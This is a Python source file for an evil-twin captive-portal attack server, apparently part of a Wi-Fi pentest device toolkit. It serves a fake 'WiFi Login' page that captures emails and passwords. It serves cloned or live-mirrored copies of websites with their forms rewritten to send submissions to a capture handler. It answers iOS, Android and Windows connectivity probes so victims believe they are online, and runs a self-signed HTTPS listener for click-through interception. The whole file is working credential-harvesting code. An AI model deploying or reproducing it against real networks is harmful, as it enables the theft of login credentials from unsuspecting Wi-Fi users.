"""server.py - HTTP server for the captive portal attack.

Listens on port 80 of the pager's br-lan address. Routes requests
based on the panel state (Portal / Spoof / MITM toggles).

Request flow:
  1. Portal first — if Portal is ON and the victim's MAC hasn't
     "passed" the splash page yet, serve the portal template.
     POST to /portal/submit captures the form fields and marks
     the MAC as passed.
  2. Spoof next — if Spoof is ON, look up the requested Host
     header in templates/spoof/<host>/index.html and serve it.
     POST to /capture stores form fields keyed by host.
  3. MITM next — if MITM is ON and Spoof had no entry for the
     host, fetch the live site, rewrite forms to /capture, save
     the result to templates/spoof/<host>/index.html for next
     time, and serve.
  4. Fallback — return 200 with an empty page (apple captive
     portal probe behavior).
"""

import io
import gzip
import json
import os
import socket
import ssl
import subprocess
import threading
import time
import urllib.parse
from http.server import HTTPServer, ThreadingHTTPServer, BaseHTTPRequestHandler

from captive import captures, dns_hijack


CAPTIVE_AP_IFACE = 'wlan0mgmt'
CERT_PATH = '/tmp/pagerctl_captive_cert.pem'
KEY_PATH = '/tmp/pagerctl_captive_key.pem'


HERE = os.path.dirname(os.path.abspath(__file__))
PORTAL_TEMPLATES_DIR = os.path.join(HERE, 'templates', 'portal')
SPOOF_DIR = os.path.join(HERE, 'templates', 'spoof')

# Captive-portal probe paths the OS hits to test for internet.
# When a passed client hits these, return the canonical "you have
# internet" response so the OS dismisses its captive popup.
PROBE_PATHS = (
    '/hotspot-detect.html',          # iOS / macOS
    '/library/test/success.html',    # iOS legacy
    '/generate_204',                 # Android / Chrome
    '/gen_204',                      # Android variant
    '/connecttest.txt',              # Windows
    '/ncsi.txt',                     # Windows legacy
)

_APPLE_FALLBACK_HTML = (
    '<HTML><HEAD><TITLE>Success</TITLE></HEAD>'
    '<BODY>Success</BODY></HTML>'
)
WINDOWS_NCSI_BODY = 'Microsoft NCSI'
WINDOWS_CONNECTTEST_BODY = 'Microsoft Connect Test'


def _apple_success_html():
    """Return the styled success page for the active template.
    Falls back through: template/success.html → default/success.html
    → the bare Apple-recognized bytes, so a template that ships only
    an index.html still gets a nice success page."""
    tmpl = state.get('portal_template', 'default')
    for candidate in (tmpl, 'default'):
        path = os.path.join(PORTAL_TEMPLATES_DIR, candidate, 'success.html')
        try:
            with open(path, 'rb') as f:
                return f.read()
        except Exception:
            continue
    return _APPLE_FALLBACK_HTML

# Mutable state controlled by captive_ui via update_state()
state = {
    'portal_enabled': True,
    'spoof_enabled': False,
    'mitm_enabled': False,
    'mirror_banner': True,  # red "PAGERCTL MITM MIRROR" overlay on cloned pages
    'portal_template': 'default',
    'passed_macs': set(),  # victim MACs that already submitted the splash form
}


_MIRROR_BANNER_TMPL = (
    '<div style="position:fixed;top:0;left:0;right:0;z-index:2147483647;'
    'background:#ff1744;color:#fff;font:14px/1.4 -apple-system,sans-serif;'
    'padding:8px 12px;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,0.3);">'
    '⚠ PAGERCTL MITM MIRROR — host: <b>{host}</b></div>'
)


def _inject_banner(html_bytes, host):
    """Splice the visible MITM banner into a cached HTML response.
    No-op if the toggle is off or the body decode fails."""
    if not state.get('mirror_banner'):
        return html_bytes
    try:
        html = html_bytes.decode('utf-8', errors='replace')
    except Exception:
        return html_bytes
    banner = _MIRROR_BANNER_TMPL.format(host=host)
    import re as _re
    if _re.search(r'<body[^>]*>', html, _re.IGNORECASE):
        html = _re.sub(r'(<body[^>]*>)', r'\1' + banner, html,
                        count=1, flags=_re.IGNORECASE)
    else:
        html = banner + html
    return html.encode('utf-8')


def update_state(**kwargs):
    """Called by captive_ui when the user changes settings."""
    for k, v in kwargs.items():
        if k == 'passed_macs':
            continue  # never overwrite the live set
        state[k] = v


# ----------------------------------------------------------------------
# Handler
# ----------------------------------------------------------------------

CAPTIVE_LOG = '/tmp/pagerctl_captive.log'


def _log(line):
    try:
        with open(CAPTIVE_LOG, 'a') as f:
            f.write(time.strftime('%H:%M:%S ') + line + '\n')
    except Exception:
        pass


class CaptiveHandler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass  # silent — we use _log() for our own structured trace

    # -- Helpers ------------------------------------------------------

    def _client_mac(self):
        """Resolve the client's source IP to its MAC via /proc/net/arp."""
        ip = self.client_address[0]
        try:
            with open('/proc/net/arp') as f:
                for line in f.readlines()[1:]:
                    cols = line.split()
                    if len(cols) >= 4 and cols[0] == ip:
                        return cols[3].lower()
        except Exception:
            pass
        return ip  # fall back to IP if arp lookup fails

    def _send(self, status, ctype, body, extra_headers=None):
        if isinstance(body, str):
            body = body.encode('utf-8')
        self.send_response(status)
        self.send_header('Content-Type', ctype)
        self.send_header('Content-Length', str(len(body)))
        self.send_header('Cache-Control', 'no-store')
        if extra_headers:
            for k, v in extra_headers.items():
                self.send_header(k, v)
        self.end_headers()
        try:
            self.wfile.write(body)
        except BrokenPipeError:
            pass

    def _asset_cache_path(self, host, path):
        """Map a host+url path to a cached file path under
        <SPOOF_DIR>/<host>/_assets/<safe_url>. Strips ?query and
        normalises slashes; returns (file_path, meta_path)."""
        rel = path.split('?', 1)[0].lstrip('/')
        if not rel or '..' in rel.split('/'):
            return None, None
        base = os.path.join(SPOOF_DIR, host, '_assets', rel)
        return base, base + '.ctype'

    def _asset_cache_lookup(self, host, path):
        fp, mp = self._asset_cache_path(host, path)
        if not fp or not os.path.isfile(fp):
            return None
        try:
            with open(fp, 'rb') as f:
                body = f.read()
            try:
                with open(mp) as cf:
                    ctype = cf.read().strip() or 'application/octet-stream'
            except Exception:
                ctype = 'application/octet-stream'
            return (ctype, body)
        except Exception:
            return None

    def _asset_cache_store(self, host, path, ctype, body):
        fp, mp = self._asset_cache_path(host, path)
        if not fp:
            return
        try:
            os.makedirs(os.path.dirname(fp), exist_ok=True)
            with open(fp, 'wb') as f:
                f.write(body)
            with open(mp, 'w') as cf:
                cf.write(ctype)
        except Exception:
            pass

    def _serve_spoof_html(self, path, host):
        """Serve a cloned HTML file with the optional MITM banner
        injected at runtime. Toggle is state['mirror_banner']."""
        try:
            with open(path, 'rb') as f:
                body = f.read()
        except Exception:
            return self._send(404, 'text/plain', 'not found')
        body = _inject_banner(body, host)
        self._send(200, 'text/html; charset=utf-8', body)

    def _serve_file(self, path):
        try:
            with open(path, 'rb') as f:
                body = f.read()
        except Exception:
            self._send(404, 'text/plain', 'not found')
            return
        ext = os.path.splitext(path)[1].lower()
        ctype = {
            '.html': 'text/html; charset=utf-8',
            '.css': 'text/css; charset=utf-8',
            '.js': 'application/javascript; charset=utf-8',
            '.png': 'image/png',
            '.jpg': 'image/jpeg',
            '.svg': 'image/svg+xml',
        }.get(ext, 'application/octet-stream')
        self._send(200, ctype, body)

    def _read_body(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            return self.rfile.read(length).decode('utf-8', errors='replace')
        except Exception:
            return ''

    def _parse_form(self, body):
        try:
            return {k: v[0] if v else '' for k, v in urllib.parse.parse_qs(body).items()}
        except Exception:
            return {'raw': body}

    def _host_from_headers(self):
        return (self.headers.get('Host', '') or '').split(':', 1)[0].lower()

    # -- GET ----------------------------------------------------------

    def do_GET(self):
        host = self._host_from_headers()
        path = self.path.split('?', 1)[0]
        mac = self._client_mac()
        passed = mac in state['passed_macs']
        _log(f'GET {host}{path} mac={mac} passed={passed}')

        # Captive-portal probe handling. Two cases:
        #  - MAC has already passed the portal: respond with the
        #    canonical success body so the OS marks the network as
        #    "online" and dismisses the captive popup.
        #  - MAC hasn't passed yet: deliberately serve the portal
        #    HTML instead of success — that's what triggers the
        #    captive browser to pop in the first place.
        if path in PROBE_PATHS:
            if mac in state['passed_macs']:
                return self._send_probe_success(path)
            return self._serve_portal_or_handler(host, mac)

        # Static asset under /static/
        if path.startswith('/static/'):
            rel = path[len('/static/'):]
            if '..' in rel:
                return self._send(403, 'text/plain', 'forbidden')
            full = os.path.join(PORTAL_TEMPLATES_DIR,
                                state.get('portal_template', 'default'),
                                rel)
            return self._serve_file(full)

        # Asset passthrough — non-root paths for HOSTS WE HAVE CACHED
        # get proxied to the real upstream so the cloned page can
        # load its images, css, fonts, etc.
        #
        # Assets are persisted to <SPOOF_DIR>/<host>/_assets/<path>
        # on first fetch, so the second visit (and every later
        # visit) serves them from disk — no upstream round trip.
        # This is the difference between "page takes 30s" and
        # "page takes 0.5s" for image-heavy spoofs.
        if (passed and host and path not in ('', '/')
                and (state.get('mitm_enabled') or state.get('spoof_enabled'))):
            spoof_index = os.path.join(SPOOF_DIR, host, 'index.html')
            if os.path.isfile(spoof_index):
                cached = self._asset_cache_lookup(host, path)
                if cached is not None:
                    ctype, body = cached
                    return self._send(200, ctype, body)
                try:
                    from captive import mirror
                    fetched = mirror.passthrough(host, self.path)
                    if fetched is not None:
                        status, ctype, body = fetched
                        if 200 <= status < 300:
                            self._asset_cache_store(host, path, ctype, body)
                        return self._send(status, ctype, body)
                except Exception:
                    pass

        # Default routing
        return self._serve_portal_or_handler(host, mac)

    def _send_probe_success(self, path):
        """Return the OS-specific 'you have internet' response."""
        if path == '/generate_204' or path == '/gen_204':
            self.send_response(204)
            self.send_header('Content-Length', '0')
            self.send_header('Cache-Control', 'no-store')
            self.end_headers()
            return
        if path == '/ncsi.txt':
            return self._send(200, 'text/plain', WINDOWS_NCSI_BODY)
        if path == '/connecttest.txt':
            return self._send(200, 'text/plain', WINDOWS_CONNECTTEST_BODY)
        # Apple paths — return the EXACT canonical bytes. Apple's
        # CaptiveNetworkAssistant string-matches against this, and
        # any wrapping HTML (even with the word "Success" in it)
        # leaves the network flagged as still-captive, which iOS
        # then surfaces as "no internet connection". The user sees
        # the styled success page on the form-submit response, not
        # here — this path is only hit for OS-internal probes.
        return self._send(200, 'text/html; charset=utf-8',
                          _APPLE_FALLBACK_HTML)

    def _serve_portal_or_handler(self, host, mac):
        # 1. Portal gate
        if state.get('portal_enabled') and mac not in state['passed_macs']:
            tmpl = state.get('portal_template', 'default')
            html_path = os.path.join(PORTAL_TEMPLATES_DIR, tmpl, 'index.html')
            if os.path.isfile(html_path):
                return self._serve_file(html_path)
            return self._send(200, 'text/html; charset=utf-8', _DEFAULT_PORTAL_HTML)

        # 2. Spoof — look up host in spoof library
        if state.get('spoof_enabled') and host:
            spoof_path = os.path.join(SPOOF_DIR, host, 'index.html')
            if os.path.isfile(spoof_path):
                return self._serve_spoof_html(spoof_path, host)

        # 3. MITM — fetch live, rewrite, cache to spoof library
        if state.get('mitm_enabled') and host:
            try:
                from captive import mirror
                ok = mirror.clone_to_spoof_library(host)
                if ok:
                    spoof_path = os.path.join(SPOOF_DIR, host, 'index.html')
                    if os.path.isfile(spoof_path):
                        return self._serve_spoof_html(spoof_path, host)
            except Exception:
                pass

        # 4. Fallback. If the client has already passed the portal,
        # we don't want to re-serve the splash — they think they're
        # online. Send a 302 to the HTTPS version of whatever they
        # asked for so plain-HTTP requests appear to "just work"
        # (most sites force HTTPS anyway, and HTTPS isn't intercepted).
        if mac in state['passed_macs']:
            if host:
                location = 'https://' + host + self.path
                self.send_response(302)
                self.send_header('Location', location)
                self.send_header('Content-Length', '0')
                self.end_headers()
                return
            return self._send(200, 'text/html; charset=utf-8', '')

        # Not passed — serve the portal template
        tmpl = state.get('portal_template', 'default')
        html_path = os.path.join(PORTAL_TEMPLATES_DIR, tmpl, 'index.html')
        if os.path.isfile(html_path):
            return self._serve_file(html_path)
        return self._send(200, 'text/html; charset=utf-8', _DEFAULT_PORTAL_HTML)

    # -- POST ---------------------------------------------------------

    def do_POST(self):
        host = self._host_from_headers()
        mac = self._client_mac()
        body = self._read_body()
        fields = self._parse_form(body)
        path = self.path.split('?', 1)[0]
        _log(f'POST {host}{path} mac={mac} fields={list(fields.keys())}')

        # Determine source: the path tells us which mode captured this
        if '/portal' in path:
            captures.save(host, fields, source='portal')
            state['passed_macs'].add(mac)
            # The captive browser is sitting on /portal/submit. To
            # both (a) dismiss the captive popup and (b) show a
            # legit-looking success page, we return the styled
            # success HTML directly — it contains <title>Success</title>
            # and the literal word "Success", which is what iOS /
            # macOS look for to mark the network online. Same body
            # is also returned from /hotspot-detect.html on re-probe.
            return self._send(200, 'text/html; charset=utf-8',
                              _apple_success_html())

        if '/capture' in path or '/login' in path or path == '/' or path.endswith('.php'):
            source = 'spoof' if state.get('spoof_enabled') else 'mitm'
            captures.save(host, fields, source=source)
        else:
            captures.save(host, fields, source='unknown')

        # Spoof/MITM submissions: re-run the chain so the user gets
        # whatever the next page in the spoofed flow would be.
        return self._serve_portal_or_handler(host, mac)


_DEFAULT_PORTAL_HTML = """<!doctype html>
<html><head><meta charset="utf-8"><title>WiFi Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: system-ui, sans-serif; max-width: 480px; margin: 50px auto; padding: 20px; background: #f5f5f5; }
.card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
h1 { margin: 0 0 20px; color: #333; }
input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
button { background: #007aff; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-size: 16px; cursor: pointer; }
</style></head>
<body><div class="card">
<h1>WiFi Login</h1>
<p>Sign in to access the network.</p>
<form method="POST" action="/portal/submit">
<input type="email" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form>
</div></body></html>
"""


# ----------------------------------------------------------------------
# Server thread
# ----------------------------------------------------------------------

def _station_state():
    """Return {mac_lower: assoc_id_string} for every station currently
    associated to the captive AP.

    The `associated at [boottime]` field is a uniquely-changing
    identifier per association session: it only changes when the
    station re-associates. Tracking it lets the reaper distinguish
    'same association, still connected' from 'forgot the network and
    rejoined' — even when iOS reuses the same sticky private MAC for
    the SSID. The previous approach (connected_time < 15s) wrongly
    evicted users who authenticated within the first 15 seconds of
    the session.
    """
    out = {}
    try:
        r = subprocess.run(['iw', 'dev', CAPTIVE_AP_IFACE, 'station', 'dump'],
                            capture_output=True, text=True, timeout=3)
    except Exception:
        return out
    cur_mac = None
    for line in r.stdout.split('\n'):
        stripped = line.strip()
        if line.startswith('Station '):
            parts = line.split()
            if len(parts) >= 2:
                cur_mac = parts[1].lower()
                out[cur_mac] = ''
        elif cur_mac is not None and stripped.startswith('associated at [boottime]'):
            try:
                out[cur_mac] = stripped.split(':', 1)[1].strip()
            except Exception:
                pass
    return out


def _ensure_self_signed_cert():
    """Generate a self-signed cert + key in /tmp if one isn't there
    yet. Single cert covers any host; the victim's browser will warn
    about CN mismatch on every site, but for non-HSTS-preloaded sites
    they can click through. We don't try to be sneaky about the cert
    contents because no commodity browser will trust it anyway."""
    if os.path.isfile(CERT_PATH) and os.path.isfile(KEY_PATH):
        return True
    try:
        subprocess.run([
            'openssl', 'req', '-x509', '-nodes', '-newkey', 'rsa:2048',
            '-days', '365',
            '-keyout', KEY_PATH, '-out', CERT_PATH,
            '-subj', '/CN=captive.local',
            '-addext', 'subjectAltName=DNS:*,DNS:captive.local',
        ], capture_output=True, timeout=15)
        return os.path.isfile(CERT_PATH) and os.path.isfile(KEY_PATH)
    except Exception:
        return False


class CaptiveServer(threading.Thread):
    """HTTP listener on port 80. Spawns the reaper and (optionally)
    a sibling HTTPS listener on 443."""

    def __init__(self, port=80):
        super().__init__(daemon=True)
        self.port = port
        self.server = None
        self._stop_evt = threading.Event()
        self._reaper = None
        self._tls = None
        # {mac_lower: assoc_id} — last observed association id per MAC.
        # Used by the reaper to detect re-associations.
        self._assoc_seen = {}

    def run(self):
        try:
            # Threaded server so multiple asset requests can be
            # handled in parallel — image-heavy spoofed pages were
            # serializing through a single thread, making each
            # round-trip block the next.
            self.server = ThreadingHTTPServer(('0.0.0.0', self.port),
                                                CaptiveHandler)
            self._reaper = threading.Thread(target=self._reap_loop, daemon=True)
            self._reaper.start()
            # TLS sibling on 443 — generates a self-signed cert on first
            # run. Browsers will throw a cert warning; for non-HSTS
            # sites the user can bypass and reach the spoof/MITM HTML.
            try:
                if _ensure_self_signed_cert():
                    self._tls = CaptiveTLSServer()
                    self._tls.start()
            except Exception:
                pass
            self.server.serve_forever()
        except Exception:
            pass

    def _reap_loop(self):
        """Every few seconds:
          - prune passed_macs for stations no longer associated
          - prune passed_macs for stations whose `associated at`
            id changed since last poll (re-association → new
            session → must re-pass the portal)
          - track current associations so we detect those changes
          - verify the nft intercept rules are still installed
        """
        from captive import intercept
        while not self._stop_evt.is_set():
            try:
                stations = _station_state()  # {mac_lower: assoc_id}
                # Drop passed_macs for stations gone or re-associated
                for m in list(state['passed_macs']):
                    ml = m.lower()
                    if ml not in stations:
                        state['passed_macs'].discard(m)
                        continue
                    new_id = stations[ml]
                    prev_id = self._assoc_seen.get(ml)
                    if prev_id and new_id and prev_id != new_id:
                        # MAC re-associated since last poll
                        state['passed_macs'].discard(m)
                # Forget reaper state for stations that left
                for ml in list(self._assoc_seen.keys()):
                    if ml not in stations:
                        self._assoc_seen.pop(ml, None)
                # Record current association ids
                for ml, aid in stations.items():
                    if aid:
                        self._assoc_seen[ml] = aid
            except Exception:
                pass
            try:
                if not intercept.is_active():
                    intercept.enable()
            except Exception:
                pass
            self._stop_evt.wait(5)

    def stop(self):
        self._stop_evt.set()
        if self.server:
            try:
                self.server.shutdown()
                self.server.server_close()
            except Exception:
                pass
        if self._tls:
            try:
                self._tls.stop()
            except Exception:
                pass


class _SilentTLSHTTPServer(ThreadingHTTPServer):
    """HTTPServer whose accept loop swallows TLS handshake errors.
    Browsers connecting to the self-signed cert will frequently bail
    on the handshake (cert untrusted, HSTS, abandoned tab, etc.) and
    every failure would otherwise dump a traceback to stderr."""

    ssl_context = None

    def get_request(self):
        sock, addr = self.socket.accept()
        try:
            tls_sock = self.ssl_context.wrap_socket(sock, server_side=True)
        except Exception:
            try:
                sock.close()
            except Exception:
                pass
            raise
        return tls_sock, addr

    def handle_error(self, request, client_address):
        # Swallow handshake / read errors silently
        pass


class CaptiveTLSServer(threading.Thread):
    """HTTPS listener on port 443 that wraps the same CaptiveHandler.

    Uses a self-signed cert that covers any SNI name. Browsers will
    show a warning; that's expected. For HSTS-preloaded sites the
    browser refuses entirely, so this is only useful for the long
    tail of HTTPS sites that aren't in the preload list.
    """

    def __init__(self, port=443):
        super().__init__(daemon=True)
        self.port = port
        self.server = None

    def run(self):
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(certfile=CERT_PATH, keyfile=KEY_PATH)
            self.server = _SilentTLSHTTPServer(('0.0.0.0', self.port),
                                                CaptiveHandler)
            self.server.ssl_context = ctx
            self.server.serve_forever()
        except Exception:
            pass

    def stop(self):
        if self.server:
            try:
                self.server.shutdown()
                self.server.server_close()
            except Exception:
                pass


_singleton = None


def start(port=80):
    """Start the captive portal HTTP server on the given port."""
    global _singleton
    if _singleton is not None and _singleton.is_alive():
        return _singleton
    _singleton = CaptiveServer(port=port)
    _singleton.start()
    return _singleton


def stop():
    global _singleton
    if _singleton is not None:
        _singleton.stop()
        _singleton = None


def is_running():
    return _singleton is not None and _singleton.is_alive()
